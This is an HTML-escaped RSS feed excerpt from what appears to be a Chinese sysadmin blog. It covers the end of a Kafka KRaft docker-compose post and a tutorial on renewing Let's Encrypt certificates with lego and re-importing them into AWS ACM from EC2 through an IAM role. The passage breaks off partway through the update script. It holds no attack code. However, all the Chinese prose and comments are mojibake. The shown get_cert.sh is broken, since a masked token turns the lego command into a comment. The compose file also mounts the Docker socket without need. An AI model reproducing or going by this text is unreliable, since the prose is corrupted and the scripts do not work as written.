&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;name: &lt;span class=&#34;s1&#34;&gt;&amp;#39;stream&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;services:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  kafka:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    image: confluentinc/cp-kafka:latest
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    hostname: kafka
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    container_name: kafka
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ports:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - 9092:9092
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - 9093:9093
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    environment:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KAFKA_KRAFT_MODE: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# This enables KRaft mode in Kafka.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KAFKA_PROCESS_ROLES: controller,broker  &lt;span class=&#34;c1&#34;&gt;# Kafka acts as both broker and controller.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KAFKA_NODE_ID: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# A unique ID for this Kafka instance.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KAFKA_CONTROLLER_QUORUM_VOTERS: 1@10.8.1.119:9093  &lt;span class=&#34;c1&#34;&gt;# Defines the controller voters.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KAFKA_LISTENERS: PLAINTEXT://0.0.0.0:9092,CONTROLLER://0.0.0.0:9093
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: PLAINTEXT:PLAINTEXT,CONTROLLER:PLAINTEXT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KAFKA_INTER_BROKER_LISTENER_NAME: PLAINTEXT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KAFKA_CONTROLLER_LISTENER_NAMES: CONTROLLER
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://10.8.1.119:9092
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KAFKA_LOG_DIRS: /var/lib/kafka/data  &lt;span class=&#34;c1&#34;&gt;# Where Kafka stores its logs.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KAFKA_AUTO_CREATE_TOPICS_ENABLE: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# Kafka will automatically create topics if needed.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# Since weâ€™re running one broker, one replica is enough.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KAFKA_LOG_RETENTION_HOURS: &lt;span class=&#34;m&#34;&gt;168&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# Keep logs for 7 days.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KAFKA_GROUP_INITIAL_REBALANCE_DELAY_MS: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# No delay for consumer rebalancing.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      CLUSTER_ID: Mk3OEYBSD34fcwNTJENDM2Qk  &lt;span class=&#34;c1&#34;&gt;# A unique ID for the Kafka cluster.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    volumes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - /var/run/docker.sock:/var/run/docker.sock
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - ./data:/var/lib/kafka/data  &lt;span class=&#34;c1&#34;&gt;# Store Kafka logs on your local machine.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä»¥ä¸Šçš„æ–‡ä»¶ï¼Œæš´éœ²äº†2ä¸ªç«¯å£ï¼Œ9092å’Œ9093ï¼Œ9092ç”¨äºå®¢æˆ·ç«¯è¿æ¥ï¼Œ9093ç”¨äºé›†ç¾¤é€šè®¯ï¼›&lt;code&gt;KAFKA_KRAFT_MODE: true&lt;/code&gt;ç”¨kraftä¸ç”¨zk. ClUSTER_IDå¯ä»¥æ¢ä¸ªä¸åŒçš„ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>awsçš„EC2æœåŠ¡å™¨ç”¨legoè·å¾—å…è´¹è¯ä¹¦å¹¶æ›´æ–°åˆ°ACM</title>
      <link>https://rendoumi.com/posts/20250725-aws_route53_update_certificate/</link>
      <pubDate>Fri, 25 Jul 2025 10:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250725-aws_route53_update_certificate/</guid>
      <description>&lt;p&gt;äº¤ä»£ä¸€ä¸‹èƒŒæ™¯ï¼š&lt;/p&gt;
&lt;p&gt;å…¬å¸åœ¨AWSä¸Šç”¨çš„æ˜¯EKS+Fargateï¼Œè¿˜æœ‰ä¸€ä¸ªè·³æ¿æœºï¼Œè¯ä¹¦å‘¢å°±ä¸å¤ªæƒ³ç”¨awsæ”¶è´¹çš„äº†ï¼Œå¹²è„†ç”¨å…è´¹çš„è¯ä¹¦å¥½äº†ã€‚&lt;/p&gt;
&lt;p&gt;é‚£é—®é¢˜å°±æ¥äº†ï¼ŒLetâ€˜s encryptçš„è¯ä¹¦90å¤©åˆ°æœŸï¼Œå·²ç»æ‰‹åŠ¨æ›´æ–°è¿‡3æ¬¡äº†ï¼Œå®åœ¨å¤ªéº»çƒ¦äº†ï¼Œèƒ½ä¸èƒ½è‡ªåŠ¨ç”³è¯·å¹¶æ›´æ–°åˆ°ACMå‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼ŒåŸç†æ˜¯ï¼šåˆ©ç”¨EC2å¯ä»¥æºå¸¦IAMè§’è‰²çš„åŸç†ï¼Œå°±å¯ä»¥æ— å‡­è¯æ›´æ–°å…è´¹è¯ä¹¦åˆ°AWS Certificate Manageräº†&lt;/p&gt;
&lt;p&gt;åšæ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€é¦–å…ˆå»ACMä¸­æ‹¿åˆ°è¯ä¹¦çš„ARNï¼Œè¦ç¡®ä¿IAMæƒé™ä¸å¤–æ³„ï¼Œé¿å…æ›´æ–°é”™è¯ä¹¦&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250725144718592&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250725-aws_route53_update_certificate/image-20250725144718592.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;äºŒã€ç”Ÿæˆä¸€ä¸ªIAMçš„policyï¼Œå‘½åä¸º&lt;code&gt;AllowUpdateCertificate&lt;/code&gt;ï¼Œåªå…è®¸æ›´æ–°è¿™ä¸¤ä¸ªç‰¹å®šçš„è¯ä¹¦&lt;/p&gt;
&lt;p&gt;å…·ä½“ç­–ç•¥å†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;s2&#34;&gt;&amp;#34;Version&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;2012-10-17&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;s2&#34;&gt;&amp;#34;Statement&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;s2&#34;&gt;&amp;#34;Effect&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Allow&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;s2&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;s2&#34;&gt;&amp;#34;acm:ImportCertificate&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;s2&#34;&gt;&amp;#34;Resource&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;s2&#34;&gt;&amp;#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/arn01&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;s2&#34;&gt;&amp;#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/arn02&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20250725145030921&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250725-aws_route53_update_certificate/image-20250725145030921.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸‰ã€IAMç”Ÿæˆä¸€ä¸ªroleè§’è‰²ï¼Œå‘½åä¸º&lt;code&gt;Ec2UpdateCertificateRole&lt;/code&gt;ï¼ŒæŠŠ&lt;code&gt;AllowUpdateCertificate&lt;/code&gt;ç­–ç•¥ç»™é™„ä¸Š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250725145132762&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250725-aws_route53_update_certificate/image-20250725145132762.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å››ã€åˆ°EC2çš„å®ä¾‹è¯¦ç»†ä¿¡æ¯ä¸­ï¼Œæ“ä½œ&amp;ndash;&amp;gt;å®‰å…¨&amp;ndash;&amp;gt;ä¿®æ”¹IAMè§’è‰²&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250725145419632&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250725-aws_route53_update_certificate/image-20250725145419632.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é™„ä¸Š&lt;code&gt;Ec2UpdateCertificateRole&lt;/code&gt;è¿™ä¸ªè§’è‰²&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250725145533303&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250725-aws_route53_update_certificate/image-20250725145533303.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;äº”ã€åœ¨EC2çš„æœºå™¨ä¸Šï¼Œè£…å¥½AWS CLIï¼Œè¿˜æœ‰lego(ç”³è¯·Let&amp;rsquo;s encryptè¯ä¹¦çš„è½¯ä»¶)&lt;/p&gt;
&lt;p&gt;å…ˆå†™å¥½è·å¾—è¯ä¹¦çš„è„šæœ¬ get_cert.shï¼ŒåŸŸåDNSè§£ææ˜¯æ‰˜ç®¡åˆ°cloudflareçš„ï¼Œæ‰€ä»¥ä¹Ÿç›´æ¥ç”¨API TOKENæ¥å¤„ç†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;CLOUDFLARE_DNS_API_TOKEN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;######## /usr/local/bin/lego --path /usr/local/bin/certs --email zhangranrui@rendoumi.com --dns cloudflare --domains *.rendoumi.com --domains rendoumi.com renew --renew-hook=&amp;#34;/usr/local/bin/update_aws_cert.sh&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‚æ•°&lt;code&gt;--renew-hook&lt;/code&gt;å¦‚æœæœ‰æ–°è¯ä¹¦ï¼Œå°±è°ƒç”¨åé¢çš„è„šæœ¬ã€‚å¦‚æœæ²¡æœ‰æ–°è¯ä¹¦ï¼Œå°±æ— æ“ä½œï¼Œé¿å…æ— ç”¨åŠŸã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åå†å†™å¥½ update_aws_cert.shï¼Œè¿™å°±æ˜¯ä¸ªåƒå­—æ–‡äº†ï¼Œç”±geminiç”Ÿæˆçš„ï¼š&lt;/p&gt;
&lt;p&gt;ç”±äºlegoç”Ÿæˆçš„crtæ˜¯è¯ä¹¦+è¯ä¹¦é“¾ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥è¦æŠŠè¯ä¹¦éƒ¨åˆ†ç»™å•ç‹¬æ‹†å‡ºæ¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /usr/local/bin/certs/certificates
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#é¦–å…ˆæŠŠè¯ä¹¦å•ç‹¬æ‹†å‡ºæ¥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;awk &lt;span class=&#34;s1&#34;&gt;&amp;#39;/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/ {print} /-----END CERTIFICATE-----/ {exit}&amp;#39;&lt;/span&gt; _.rendoumi.com.crt &amp;gt; _.rendoumi.com.only
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# --- é…ç½®éƒ¨åˆ† ---&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ‚¨è¦æ›´æ–°çš„ç°æœ‰ ACM è¯ä¹¦çš„ ARN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç¤ºä¾‹ï¼šCERTIFICATE_ARN=&amp;#34;arn:aws:acm:ap-southeast-1:123456789012:certificate/abcdefab-1234-5678-abcd-1234567890ab&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;CERTIFICATE_ARN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/11111111-1111-1111-1111-111111111111&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ–°è¯ä¹¦æ–‡ä»¶çš„è·¯å¾„ï¼ˆä¾‹å¦‚ï¼š/opt/certs/new_certificate.crtï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç¡®ä¿è¿™ä¸ªè·¯å¾„åœ¨æ‚¨çš„EC2å®ä¾‹ä¸Šæ˜¯æ­£ç¡®çš„&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;CERTIFICATE_BODY_PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;_.rendoumi.com.only&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ–°ç§é’¥æ–‡ä»¶çš„è·¯å¾„ï¼ˆä¾‹å¦‚ï¼š/opt/certs/private.keyï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç¡®ä¿è¿™ä¸ªè·¯å¾„åœ¨æ‚¨çš„EC2å®ä¾‹ä¸Šæ˜¯æ­£ç¡®çš„&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;PRIVATE_KEY_PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;_.rendoumi.com.key&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è¯ä¹¦é“¾æ–‡ä»¶çš„è·¯å¾„ï¼ˆå¯é€‰ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å¦‚æœæ²¡æœ‰è¯ä¹¦é“¾ï¼Œè¯·å°†æ­¤å˜é‡ç•™ç©ºæˆ–æ³¨é‡Šæ‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç¤ºä¾‹ï¼šCERTIFICATE_CHAIN_PATH=&amp;#34;/opt/certs/ca_bundle.crt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;CERTIFICATE_CHAIN_PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;_.rendoumi.com.issuer.crt&amp;#34;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# å¦‚æœæ²¡æœ‰é“¾ï¼Œè¯·å°†å…¶ç•™ç©º &amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ACM è¯ä¹¦æ‰€åœ¨çš„ AWS åŒºåŸŸ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è¿™ä¸ªåŒºåŸŸåº”è¯¥ä¸ CERTIFICATE_ARN ä¸­çš„åŒºåŸŸåŒ¹é…&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç¤ºä¾‹ï¼šAWS_REGION=&amp;#34;ap-southeast-1&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;AWS_REGION&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ap-southeast-1&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# --- é…ç½®éƒ¨åˆ†ç»“æŸ ---&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--- å¼€å§‹ä½¿ç”¨å®ä¾‹è§’è‰²é‡æ–°å¯¼å…¥ ACM è¯ä¹¦ ---&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;è¯ä¹¦ ARN: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;CERTIFICATE_ARN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;åŒºåŸŸ: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;AWS_REGION&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ! -f &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;CERTIFICATE_BODY_PATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
